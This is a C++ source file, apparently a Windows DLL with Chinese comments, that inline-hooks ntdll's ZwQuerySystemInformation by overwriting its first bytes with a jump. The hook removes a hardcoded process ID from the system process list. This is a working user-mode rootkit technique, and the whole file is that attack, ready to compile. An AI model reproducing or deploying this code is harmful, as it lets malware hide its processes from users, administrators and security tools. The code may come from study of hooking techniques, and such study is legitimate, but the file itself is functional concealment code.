#include "pch.h"
#include "HideProcess.h"


BYTE g_OldData32[5] = {0};
BYTE g_OldData64[12] = { 0 };


void HookApi()
{
	// 获取 ntdll.dll 的加载基址, 若没有则返回
	HMODULE hDll = ::GetModuleHandle("ntdll.dll");
	if (NULL == hDll)
	{
		return;
	}
	// 获取 ZwQuerySystemInformation 函数地址
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return;
	}
	// 32 位下修改前 5 字节, 64 位下修改前 12 字节
#ifndef _WIN64
	// jmp New_ZwQuerySystemInformation
	// 机器码位：e9 _dwOffset(跳转偏移)
	//		addr1 --> jmp _dwNewAddress指令的下一条指令的地址，即eip的值
	//		addr2 --> 跳转地址的值，即_dwNewAddress的值
	//		跳转偏移 _dwOffset = addr2 - addr1
	BYTE pData[5] = { 0xe9, 0, 0, 0, 0};
	DWORD dwOffset = (DWORD)New_ZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - 5;
	::RtlCopyMemory(&pData[1], &dwOffset, sizeof(dwOffset));
	// 保存前 5 字节数据
	::RtlCopyMemory(g_OldData32, ZwQuerySystemInformation, sizeof(pData));
#else
	// mov rax,0x1122334455667788
	// jmp rax
	// 机器码是：
	//	48 b8 8877665544332211
	//	ff e0
	BYTE pData[12] = {0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xe0};
	ULONGLONG ullOffset = (ULONGLONG)New_ZwQuerySystemInformation;
	::RtlCopyMemory(&pData[2], &ullOffset, sizeof(ullOffset));
	// 保存前 12 字节数据
	::RtlCopyMemory(g_OldData64, ZwQuerySystemInformation, sizeof(pData));
#endif
	// 设置页面的保护属性为 可读、可写、可执行
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), PAGE_EXECUTE_READWRITE, &dwOldProtect);
	// 修改
	::RtlCopyMemory(ZwQuerySystemInformation, pData, sizeof(pData));
	// 还原页面保护属性
	::VirtualProtect(ZwQuerySystemInformation, sizeof(pData), dwOldProtect, &dwOldProtect);

}


void UnhookApi()
{
	// 获取 ntdll.dll 的加载基址, 若没有则返回
	HMODULE hDll = ::GetModuleHandle("ntdll.dll");
	if (NULL == hDll)
	{
		return;
	}
	// 获取 ZwQuerySystemInformation 函数地址
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return;
	}
	// 设置页面的保护属性为 可读、可写、可执行
	DWORD dwOldProtect = 0;
	::VirtualProtect(ZwQuerySystemInformation, 12, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// 32 位下还原前 5 字节, 64 位下还原前 12 字节
#ifndef _WIN64
	// 还原
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData32, sizeof(g_OldData32));
#else
	// 还原
	::RtlCopyMemory(ZwQuerySystemInformation, g_OldData64, sizeof(g_OldData64));
#endif

	// 还原页面保护属性
	::VirtualProtect(ZwQuerySystemInformation, 12, dwOldProtect, &dwOldProtect);
}


NTSTATUS New_ZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	)
{
	NTSTATUS status = 0;
	PSYSTEM_PROCESS_INFORMATION pCur = NULL, pPrev = NULL;
	// 要隐藏的进程PID
	DWORD dwHideProcessId = 96;

	// UNHOOK API
	UnhookApi();

	// 获取 ntdll.dll 的加载基址, 若没有则返回
	HMODULE hDll = ::GetModuleHandle("ntdll.dll");
	if (NULL == hDll)
	{
		return status;
	}
	// 获取 ZwQuerySystemInformation 函数地址
	typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::GetProcAddress(hDll, "ZwQuerySystemInformation");
	if (NULL == ZwQuerySystemInformation)
	{
		return status;
	}

	// 调用原函数 ZwQuerySystemInformation
	status = ZwQuerySystemInformation(SystemInformationClass, SystemInformation,
						SystemInformationLength, ReturnLength);
	if (NT_SUCCESS(status) && 5 == SystemInformationClass)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			// 判断是否是要隐藏的进程PID
			if (dwHideProcessId == (DWORD)pCur->UniqueProcessId)
			{
				if (0 == pCur->NextEntryOffset)
				{
					pPrev->NextEntryOffset = 0;
				}
				else
				{
					pPrev->NextEntryOffset = pPrev->NextEntryOffset + pCur->NextEntryOffset;
				}
			}
			else
			{
				pPrev = pCur;
			}

			if (0 == pCur->NextEntryOffset)
			{
				break;
			}
			pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE *)pCur + pCur->NextEntryOffset);
		}
	}

	// HOOK API
	HookApi();

	return status;
}